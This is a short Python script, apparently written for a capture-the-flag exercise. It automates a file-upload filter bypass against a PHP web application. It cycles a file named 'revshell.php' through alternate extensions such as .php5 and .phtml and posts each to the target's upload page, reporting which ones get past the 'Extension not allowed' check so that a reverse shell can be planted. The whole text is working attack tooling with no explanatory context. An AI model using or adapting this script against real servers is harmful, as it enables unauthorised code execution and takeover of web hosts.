#!/usr/bin/env python

import requests
import os

IP = 'XXX'
port = 3333
url = f'http://{IP}:{port}/internal/index.php'

old_filename = 'revshell.php'
filename = 'revshell'

extensions = [
    ".php",
    ".php3",
    ".php4",
    ".php5",
    ".phtml",
    ]

for ext in extensions:
    new_filename = filename + ext
    os.rename(old_filename, new_filename)
    
    files = {'file': open(new_filename, 'rb')}
    r = requests.post(url, files=files)
    
    if 'Extension not allowed' in r.text:
        print(f'{ext} not allowed')
    else:
        print(f'{ext} allowed')

    old_filename = new_filename
